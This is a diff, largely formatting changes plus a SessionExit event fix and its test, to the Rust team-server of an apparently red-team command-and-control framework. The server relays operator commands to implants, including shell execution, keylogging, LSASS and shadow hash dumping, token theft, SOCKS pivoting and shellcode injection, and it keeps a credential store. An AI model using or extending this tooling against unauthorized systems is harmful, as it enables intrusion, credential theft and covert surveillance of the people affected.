@@ -6,9 +6,9 @@
 //! - `POST /api/task`          — queue a task for a session (JSON).
 //! - `GET  /api/results`       — drain task results for a session (JSON).
 
-pub mod tls;
-pub mod operators;
 pub mod audit;
+pub mod operators;
+pub mod tls;
 
 use std::sync::Arc;
 use std::time::{Instant, SystemTime, UNIX_EPOCH};
@@ -46,8 +46,7 @@ use axum::{
 use dashmap::DashMap;
 use nyx_protocol::{
     encode_frame_dir, open_frame, parse_frame, wire::Reader, Command, Direction, FileOp,
-    Response as MsgResponse,
-    ServerKeypair, SessionInfo, SessionKey, Task, TaskResponse,
+    Response as MsgResponse, ServerKeypair, SessionInfo, SessionKey, Task, TaskResponse,
 };
 use serde::{Deserialize, Serialize};
 
@@ -128,9 +127,7 @@ impl Default for AppState {
             killdate: None,
             events: nyx_scripting::EventBus::new(),
             fingerprints: DashMap::new(),
-            creds: Arc::new(
-                nyx_store::CredStore::open_in_memory().expect("in-memory cred store"),
-            ),
+            creds: Arc::new(nyx_store::CredStore::open_in_memory().expect("in-memory cred store")),
             operators: Arc::new(operators::OperatorRegistry::empty()),
             audit: None,
         }
@@ -177,9 +174,10 @@ fn response_event_kind(r: &MsgResponse) -> (nyx_scripting::ResultKind, String) {
         ),
         MsgResponse::Ok => (nyx_scripting::ResultKind::Ok, String::new()),
         MsgResponse::Err(m) => (nyx_scripting::ResultKind::Err, m.clone()),
-        MsgResponse::FileChunk { name, .. } => {
-            (nyx_scripting::ResultKind::FileChunk, format!("<chunk {name}>"))
-        }
+        MsgResponse::FileChunk { name, .. } => (
+            nyx_scripting::ResultKind::FileChunk,
+            format!("<chunk {name}>"),
+        ),
         MsgResponse::BofOutput(b) => (
             nyx_scripting::ResultKind::Other,
             String::from_utf8_lossy(b).chars().take(64).collect(),
@@ -187,9 +185,10 @@ fn response_event_kind(r: &MsgResponse) -> (nyx_scripting::ResultKind, String) {
         MsgResponse::Channel { chan, .. } => {
             (nyx_scripting::ResultKind::Other, format!("<chan {chan}>"))
         }
-        MsgResponse::Image(d) => {
-            (nyx_scripting::ResultKind::Other, format!("<screenshot {} bytes>", d.len()))
-        }
+        MsgResponse::Image(d) => (
+            nyx_scripting::ResultKind::Other,
+            format!("<screenshot {} bytes>", d.len()),
+        ),
     }
 }
 
@@ -198,8 +197,7 @@ fn response_event_kind(r: &MsgResponse) -> (nyx_scripting::ResultKind, String) {
 pub fn load_profile(path: &std::path::Path) -> anyhow::Result<nyx_profile::Profile> {
     let src = std::fs::read_to_string(path)
         .map_err(|e| anyhow::anyhow!("read profile {}: {e}", path.display()))?;
-    let profile = nyx_profile::parse(&src)
-        .map_err(|e| anyhow::anyhow!("parse profile: {e}"))?;
+    let profile = nyx_profile::parse(&src).map_err(|e| anyhow::anyhow!("parse profile: {e}"))?;
     let errors: Vec<_> = nyx_profile::lint(&profile)
         .into_iter()
         .filter(|d| d.severity == nyx_profile::Severity::Error)
@@ -223,7 +221,9 @@ pub fn load_profile(path: &std::path::Path) -> anyhow::Result<nyx_profile::Profi
 /// Load the server's long-term keypair from `path`, or generate + persist it
 /// (0600 on Unix) if absent. With `NYX_KEYFILE` set, sessions survive a server
 /// restart instead of getting a fresh identity each boot.
-pub fn load_or_create_keypair(path: &std::path::Path) -> anyhow::Result<nyx_protocol::ServerKeypair> {
+pub fn load_or_create_keypair(
+    path: &std::path::Path,
+) -> anyhow::Result<nyx_protocol::ServerKeypair> {
     use nyx_protocol::ServerKeypair;
     if path.exists() {
         let bytes = std::fs::read(path)?;
@@ -402,8 +402,7 @@ fn shape_beacon_response(st: &AppState, frame: Vec<u8>) -> Response {
                 );
             }
         }
-        Some(nyx_profile::Terminator::Parameter(_))
-        | Some(nyx_profile::Terminator::UriAppend) => {
+        Some(nyx_profile::Terminator::Parameter(_)) | Some(nyx_profile::Terminator::UriAppend) => {
             // The transformed bytes belong in the body for the response path.
             #[allow(clippy::collapsible_match)]
             if !extra.is_empty() {
@@ -470,7 +469,9 @@ fn handle_beacon(
         let now = SystemTime::now()
             .duration_since(UNIX_EPOCH)
             .map(|d| d.as_secs())
-            .map_err(|_| anyhow::anyhow!("clock before UNIX_EPOCH; kill-date check cannot run safely"))?;
+            .map_err(|_| {
+                anyhow::anyhow!("clock before UNIX_EPOCH; kill-date check cannot run safely")
+            })?;
         if now >= kd {
             anyhow::bail!("kill date {kd} reached; refusing beacon");
         }
@@ -540,7 +541,8 @@ fn handle_beacon(
         }
     };
 
-    let plaintext = open_frame(&key, &raw).map_err(|_| anyhow::anyhow!("frame decryption failed"))?;
+    let plaintext =
+        open_frame(&key, &raw).map_err(|_| anyhow::anyhow!("frame decryption failed"))?;
 
     if is_new {
         // First message from an implant is always its SessionInfo (check-in).
@@ -568,7 +570,11 @@ fn handle_beacon(
         });
         // Pop the inbound TLS fingerprint the sniffer captured for this peer
         // (TLS path). On plaintext (dev) or when sniff failed, both stay None.
-        let fp = st.fingerprints.remove(peer).map(|(_, v)| v).unwrap_or_default();
+        let fp = st
+            .fingerprints
+            .remove(peer)
+            .map(|(_, v)| v)
+            .unwrap_or_default();
         let session = Session {
             key,
             info,
@@ -718,7 +724,9 @@ fn authenticate(st: &AppState, headers: &HeaderMap) -> AuthOutcome {
         .map(|s| s.to_string());
     // (1) Multi-operator registry (loaded from NYX_OPERATORS_FILE / bootstrapped).
     if !st.operators.is_open() {
-        let bearer = bearer_val.as_deref().and_then(|s| s.strip_prefix("Bearer "));
+        let bearer = bearer_val
+            .as_deref()
+            .and_then(|s| s.strip_prefix("Bearer "));
         return match bearer {
             Some(b) => match st.operators.resolve(b) {
                 Some(op) => AuthOutcome::Allowed(op),
@@ -746,10 +754,7 @@ fn authenticate(st: &AppState, headers: &HeaderMap) -> AuthOutcome {
     })
 }
 
-async fn list_sessions(
-    State(st): State<Arc<AppState>>,
-    headers: HeaderMap,
-) -> Response {
+async fn list_sessions(State(st): State<Arc<AppState>>, headers: HeaderMap) -> Response {
     if let Some(r) = require_auth(&st, &headers) {
         return r;
     }
@@ -784,12 +789,22 @@ struct TaskReq {
 #[serde(tag = "type", rename_all = "lowercase")]
 enum JsonCommand {
     Ping,
-    Shell { args: String },
-    Sleep { seconds: u32, jitter_pct: u8 },
+    Shell {
+        args: String,
+    },
+    Sleep {
+        seconds: u32,
+        jitter_pct: u8,
+    },
     /// Write `data_hex` (hex-encoded bytes) to a file named `name` on the target.
-    Upload { name: String, data_hex: String },
+    Upload {
+        name: String,
+        data_hex: String,
+    },
     /// Read `path` off the target (streamed back as `FileChunk`s).
-    Download { path: String },
+    Download {
+        path: String,
+    },
     /// Execute a BOF/COFF object: `name` (entry label), `args`, `data_hex`
     /// (hex-encoded COFF bytes). Output streams back as a `BofOutput` result.
     Bof {
@@ -816,29 +831,51 @@ enum JsonCommand {
         port: u16,
     },
     /// 截屏。monitor 0=主屏。
-    Screenshot { monitor: u8 },
+    Screenshot {
+        monitor: u8,
+    },
     /// 端口扫描。
-    Portscan { host: String, ports: String },
+    Portscan {
+        host: String,
+        ports: String,
+    },
     /// 网络信息收集。
-    Net { query: String },
+    Net {
+        query: String,
+    },
     /// 磁盘信息。
     Driveinfo,
     /// 剪贴板。
     Clipboard,
     /// 环境变量。name 空串=全部。
-    Env { name: String },
+    Env {
+        name: String,
+    },
     /// 键盘记录。action 0=start 1=stop 2=dump。
-    Keylog { action: u8 },
+    Keylog {
+        action: u8,
+    },
     /// 持续截屏。
-    Screenwatch { interval_secs: u32 },
+    Screenwatch {
+        interval_secs: u32,
+    },
     /// 凭据哈希提取。method 0=LSASS 1=shadow。
-    Hashdump { method: u8 },
+    Hashdump {
+        method: u8,
+    },
     /// 中继通道写数据（operator→implant 方向）。data_hex 为 hex 编码字节。
-    ChannelData { chan: u32, data_hex: String },
+    ChannelData {
+        chan: u32,
+        data_hex: String,
+    },
     /// 关闭中继通道（显式拆除；implant 也会在 socket EOF 时自动关）。
-    ChannelClose { chan: u32 },
+    ChannelClose {
+        chan: u32,
+    },
     /// 令牌窃取：复制 `pid` 的主令牌供后续冒用。横向移动原语。
-    StealToken { pid: u32 },
+    StealToken {
+        pid: u32,
+    },
     /// 造令牌（make-token / pass-the-password）：`domain\user` + `password`。
     /// `logon_type` 1=interactive(默认) 2=network 3=new-credentials。
     MakeToken {
@@ -874,7 +911,13 @@ impl JsonCommand {
         Ok(match self {
             JsonCommand::Ping => Command::Ping,
             JsonCommand::Shell { args } => Command::Shell { args },
-            JsonCommand::Sleep { seconds, jitter_pct } => Command::Sleep { seconds, jitter_pct },
+            JsonCommand::Sleep {
+                seconds,
+                jitter_pct,
+            } => Command::Sleep {
+                seconds,
+                jitter_pct,
+            },
             JsonCommand::Upload { name, data_hex } => {
                 let data = hex::decode(&data_hex).map_err(|_| "bad data_hex")?;
                 Command::Upload { name, data }
@@ -897,7 +940,11 @@ impl JsonCommand {
                     "cp" => FileOp::Cp,
                     _ => return Err("bad file op"),
                 };
-                Command::FileOp { op: fileop, path, dest }
+                Command::FileOp {
+                    op: fileop,
+                    path,
+                    dest,
+                }
             }
             JsonCommand::Connect { host, port } => {
                 Command::Connect {
@@ -907,9 +954,17 @@ impl JsonCommand {
                     chan: next_chan(),
                 }
             }
-            JsonCommand::Socks { chan, op, addr, port } => {
-                Command::Socks { chan, op, addr, port }
-            }
+            JsonCommand::Socks {
+                chan,
+                op,
+                addr,
+                port,
+            } => Command::Socks {
+                chan,
+                op,
+                addr,
+                port,
+            },
             JsonCommand::Screenshot { monitor } => Command::Screenshot { monitor },
             JsonCommand::Portscan { host, ports } => Command::Portscan { host, ports },
             JsonCommand::Net { query } => Command::Net { query },
@@ -938,10 +993,19 @@ impl JsonCommand {
             },
             JsonCommand::Rev2Self => Command::Rev2Self,
             JsonCommand::GetUid => Command::GetUid,
-            JsonCommand::Inject { method, pid, spawn_to, sc_hex } => {
-                let shellcode = hex::decode(&sc_hex)
-                    .map_err(|_| "invalid hex in sc_hex")?;
-                Command::Inject { method, pid, spawn_to, shellcode }
+            JsonCommand::Inject {
+                method,
+                pid,
+                spawn_to,
+                sc_hex,
+            } => {
+                let shellcode = hex::decode(&sc_hex).map_err(|_| "invalid hex in sc_hex")?;
+                Command::Inject {
+                    method,
+                    pid,
+                    spawn_to,
+                    shellcode,
+                }
             }
             JsonCommand::Exit => Command::Exit,
         })
@@ -1010,7 +1074,24 @@ async fn post_task(
         _ => None,
     };
     let cmd_name = command_name(&command);
+    // Command::Exit instructs the implant to terminate; fire SessionExit now so
+    // operator hooks (`on_session_exit`) actually run. Previously the event was
+    // dispatched by the Rhai/tracing hooks but never produced, leaving
+    // `on_session_exit` dead code. We snapshot the intent before queuing (the
+    // event reflects "this session is exiting now") and fire AFTER dropping the
+    // write guard — the same liveness discipline `handle_beacon` uses for
+    // ResultReceived — so a slow operator script can't block this session's
+    // DashMap shard. `req.session` is the validated hex session id.
+    let fire_exit = matches!(command, Command::Exit);
     s.pending.push(Task { task_id, command });
+    drop(s);
+    if fire_exit {
+        st.events.fire(&nyx_scripting::Event::SessionExit(
+            nyx_scripting::SessionExit {
+                session_id: req.session.clone(),
+            },
+        ));
+    }
     if let Some(audit) = &st.audit {
         audit.append(
             "task",
@@ -1061,21 +1142,34 @@ async fn get_results(
         .into_iter()
         .map(|r| {
             let (kind, text, data_hex, seq, eof) = match r.response {
-                MsgResponse::Output(b) => {
-                    ("output", String::from_utf8_lossy(&b).into_owned(), None, None, None)
-                }
+                MsgResponse::Output(b) => (
+                    "output",
+                    String::from_utf8_lossy(&b).into_owned(),
+                    None,
+                    None,
+                    None,
+                ),
                 MsgResponse::Ok => ("ok", String::new(), None, None, None),
                 MsgResponse::Err(m) => ("error", m, None, None, None),
-                MsgResponse::FileChunk { name, seq, eof, data } => (
+                MsgResponse::FileChunk {
+                    name,
+                    seq,
+                    eof,
+                    data,
+                } => (
                     "file",
                     format!("<chunk {name}#{seq}>"),
                     Some(hex::encode(&data)),
                     Some(seq),
                     Some(eof),
                 ),
-                MsgResponse::BofOutput(b) => {
-                    ("bof", String::from_utf8_lossy(&b).into_owned(), None, None, None)
-                }
+                MsgResponse::BofOutput(b) => (
+                    "bof",
+                    String::from_utf8_lossy(&b).into_owned(),
+                    None,
+                    None,
+                    None,
+                ),
                 MsgResponse::Channel { chan, status, data } => (
                     "channel",
                     format!("<chan {chan}#{status}>"),
@@ -1130,7 +1224,10 @@ async fn list_creds(
         Ok(r) => r,
         Err(e) => {
             tracing::error!(error = %e, "cred store list failed");
-            return (StatusCode::INTERNAL_SERVER_ERROR, format!("cred store: {e}"))
+            return (
+                StatusCode::INTERNAL_SERVER_ERROR,
+                format!("cred store: {e}"),
+            )
                 .into_response();
         }
     };
@@ -1179,7 +1276,11 @@ async fn post_creds(
         }
         Err(e) => {
             tracing::error!(error = %e, "cred store upsert failed");
-            (StatusCode::INTERNAL_SERVER_ERROR, format!("cred store: {e}")).into_response()
+            (
+                StatusCode::INTERNAL_SERVER_ERROR,
+                format!("cred store: {e}"),
+            )
+                .into_response()
         }
     }
 }
@@ -1224,7 +1325,11 @@ async fn delete_cred(
         }
         Err(e) => {
             tracing::error!(error = %e, "cred store delete failed");
-            (StatusCode::INTERNAL_SERVER_ERROR, format!("cred store: {e}")).into_response()
+            (
+                StatusCode::INTERNAL_SERVER_ERROR,
+                format!("cred store: {e}"),
+            )
+                .into_response()
         }
     }
 }
@@ -1254,10 +1359,7 @@ async fn get_audit(
 }
 
 /// `GET /api/audit/verify` — walk the hash-chain. `{ "ok": bool, "broken_at": Option<u64> }`.
-async fn verify_audit(
-    State(st): State<Arc<AppState>>,
-    headers: HeaderMap,
-) -> Response {
+async fn verify_audit(State(st): State<Arc<AppState>>, headers: HeaderMap) -> Response {
     if let AuthOutcome::Denied(r) = authenticate(&st, &headers) {
         return r;
     }
@@ -1266,7 +1368,9 @@ async fn verify_audit(
     };
     let broken = match audit::AuditWriter::verify_chain(audit.path()) {
         Ok(b) => b,
-        Err(e) => return (StatusCode::INTERNAL_SERVER_ERROR, format!("audit: {e}")).into_response(),
+        Err(e) => {
+            return (StatusCode::INTERNAL_SERVER_ERROR, format!("audit: {e}")).into_response()
+        }
     };
     (
         StatusCode::OK,
@@ -1515,7 +1619,10 @@ mod tests {
         .expect("mkdir 应映射成功");
         assert!(matches!(
             cmd,
-            Command::FileOp { op: FileOp::Mkdir, .. }
+            Command::FileOp {
+                op: FileOp::Mkdir,
+                ..
+            }
         ));
     }
 
@@ -1537,18 +1644,28 @@ mod tests {
     #[test]
     fn fileop_bad_op_errors() {
         assert!(matches!(
-            JsonCommand::FileOp { op: "wat".into(), path: "x".into(), dest: None }.into_command(),
+            JsonCommand::FileOp {
+                op: "wat".into(),
+                path: "x".into(),
+                dest: None
+            }
+            .into_command(),
             Err("bad file op")
         ));
     }
 
     #[test]
     fn connect_maps_with_chan() {
-        let cmd = JsonCommand::Connect { host: "10.0.0.1".into(), port: 445 }
-            .into_command()
-            .unwrap();
+        let cmd = JsonCommand::Connect {
+            host: "10.0.0.1".into(),
+            port: 445,
+        }
+        .into_command()
+        .unwrap();
         match cmd {
-            Command::Connect { host, port, chan, .. } => {
+            Command::Connect {
+                host, port, chan, ..
+            } => {
                 assert_eq!(host, "10.0.0.1");
                 assert_eq!(port, 445);
                 assert!(chan > 0, "chan 必须由 server 分配，>0");
@@ -1560,7 +1677,10 @@ mod tests {
     #[test]
     fn socks_maps_passthrough() {
         let cmd = JsonCommand::Socks {
-            chan: 5, op: 1, addr: "1.2.3.4".into(), port: 80,
+            chan: 5,
+            op: 1,
+            addr: "1.2.3.4".into(),
+            port: 80,
         }
         .into_command()
         .unwrap();
@@ -1613,10 +1733,12 @@ mod tests {
         let pubkey = ServerKeypair::generate().public_bytes();
         let peer: std::net::SocketAddr = "127.0.0.1:9999".parse().unwrap();
         let (key, checkin) = checkin_frame(&st, &pubkey, 1);
-        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &checkin).expect("first check-in must register the session");
+        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &checkin)
+            .expect("first check-in must register the session");
         // A legitimate advance to counter 2 succeeds.
         let frame2 = response_frame(&pubkey, &key, 2);
-        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &frame2).expect("counter 2 must advance");
+        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &frame2)
+            .expect("counter 2 must advance");
         // Replaying counter 2 (stale: counter <= last_recv) must be rejected.
         let err = handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &frame2)
             .expect_err("a stale counter must be rejected, not accepted");
@@ -1636,7 +1758,8 @@ mod tests {
         let pubkey = ServerKeypair::generate().public_bytes();
         let peer: std::net::SocketAddr = "127.0.0.1:9998".parse().unwrap();
         let (key, checkin) = checkin_frame(&st, &pubkey, 1);
-        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &checkin).expect("check-in must register the session");
+        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &checkin)
+            .expect("check-in must register the session");
 
         // Race N times on monotonically-increasing counters. A single iteration
         // could accidentally serialize on a loaded CI box; N iterations make a
@@ -1745,7 +1868,8 @@ mod tests {
             .collect();
         let plaintext = TaskResponse::encode_vec(&batch);
         let frame = encode_frame_dir(&pubkey, Direction::ClientToServer, 2, &key, &plaintext);
-        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &frame).expect("ingest of oversized result batch");
+        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &frame)
+            .expect("ingest of oversized result batch");
 
         let s = st.sessions.get(&pubkey).expect("session present");
         assert_eq!(
@@ -1788,7 +1912,8 @@ mod tests {
         let mut st2 = AppState::default();
         st2.killdate = Some(u64::MAX);
         let (_key, checkin2) = checkin_frame(&st2, &pubkey, 1);
-        handle_beacon(&st2, &peer, &Method::POST, &HeaderMap::new(), &checkin2).expect("a future kill-date must allow check-in");
+        handle_beacon(&st2, &peer, &Method::POST, &HeaderMap::new(), &checkin2)
+            .expect("a future kill-date must allow check-in");
     }
 
     #[test]
@@ -1796,12 +1921,18 @@ mod tests {
         // JsonCommand paths that decode hex (Upload, Bof) must return a clean
         // error on non-hex input, not panic. The server runs under
         // `panic = "abort"`, so a panic here would kill the whole team server.
-        let bad_upload =
-            JsonCommand::Upload { name: "x".into(), data_hex: "zz".into() }.into_command();
+        let bad_upload = JsonCommand::Upload {
+            name: "x".into(),
+            data_hex: "zz".into(),
+        }
+        .into_command();
         assert!(bad_upload.is_err(), "non-hex Upload data_hex must error");
 
-        let good_upload =
-            JsonCommand::Upload { name: "x".into(), data_hex: "00ff".into() }.into_command();
+        let good_upload = JsonCommand::Upload {
+            name: "x".into(),
+            data_hex: "00ff".into(),
+        }
+        .into_command();
         assert!(good_upload.is_ok(), "valid hex Upload data_hex must decode");
 
         let bad_bof = JsonCommand::Bof {
@@ -1811,6 +1942,85 @@ mod tests {
         }
         .into_command();
         assert!(bad_bof.is_err(), "non-hex Bof data_hex must error");
+    }
+
+    // ---- SessionExit event firing (BUG 1) ----------------------------------
+    //
+    // The server never produced Event::SessionExit, leaving the Rhai
+    // `on_session_exit` hook and the tracing SessionExit arm dead. post_task is
+    // the single dispatch point for Command::Exit, so it fires the event there.
+    // This pin ensures (a) the event fires exactly once on an Exit task and
+    // (b) a non-Exit task fires NONE — guarding against an accidental wildcard.
+
+    /// Records every fired event into a shared vector of kind labels. Registered
+    /// on the bus before the AppState is shared so a test can assert what fired.
+    #[derive(Default)]
+    struct RecordingHook(std::sync::Arc<std::sync::Mutex<Vec<&'static str>>>);
+
+    impl nyx_scripting::Hook for RecordingHook {
+        fn name(&self) -> &str {
+            "recording"
+        }
+        fn on_event(&self, event: &nyx_scripting::Event) {
+            let label = match event {
+                nyx_scripting::Event::SessionNew(_) => "session_new",
+                nyx_scripting::Event::SessionExit(_) => "session_exit",
+                nyx_scripting::Event::ResultReceived(_) => "result",
+            };
+            self.0.lock().unwrap().push(label);
+        }
+    }
+
+    #[test]
+    fn exit_task_fires_session_exit_exactly_once() {
+        // A real check-in registers the session (→ SessionNew), then an Exit
+        // task dispatched via post_task must fire SessionExit exactly once; a
+        // later non-Exit task (ping) must fire none.
+        let mut st = AppState::default();
+        let rec = std::sync::Arc::new(std::sync::Mutex::new(Vec::<&'static str>::new()));
+        st.events.register(Box::new(RecordingHook(rec.clone())));
+        let st = std::sync::Arc::new(st);
+
+        let pubkey = ServerKeypair::generate().public_bytes();
+        let peer: std::net::SocketAddr = "127.0.0.1:7774".parse().unwrap();
+        let (_key, checkin) = checkin_frame(&st, &pubkey, 1);
+        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &checkin)
+            .expect("check-in must register the session before tasking exit");
+
+        let rt = tokio::runtime::Runtime::new().unwrap();
+        let exit_body = serde_json::json!({
+            "session": hex::encode(pubkey),
+            "command": { "type": "exit" },
+        });
+        let resp = rt.block_on(post_task(
+            State(st.clone()),
+            HeaderMap::new(),
+            Json(serde_json::from_value(exit_body).unwrap()),
+        ));
+        assert_eq!(resp.status(), StatusCode::OK, "Exit task must be accepted");
+
+        let ping_body = serde_json::json!({
+            "session": hex::encode(pubkey),
+            "command": { "type": "ping" },
+        });
+        let resp2 = rt.block_on(post_task(
+            State(st.clone()),
+            HeaderMap::new(),
+            Json(serde_json::from_value(ping_body).unwrap()),
+        ));
+        assert_eq!(resp2.status(), StatusCode::OK);
+
+        let events = rec.lock().unwrap();
+        assert_eq!(
+            events.iter().filter(|&&k| k == "session_new").count(),
+            1,
+            "SessionNew fires once on check-in"
+        );
+        assert_eq!(
+            events.iter().filter(|&&k| k == "session_exit").count(),
+            1,
+            "SessionExit must fire exactly once when Command::Exit is dispatched"
+        );
     }
 
     // ---- Client-envelope decode (Phase 1 Task 1.2) --------------------------
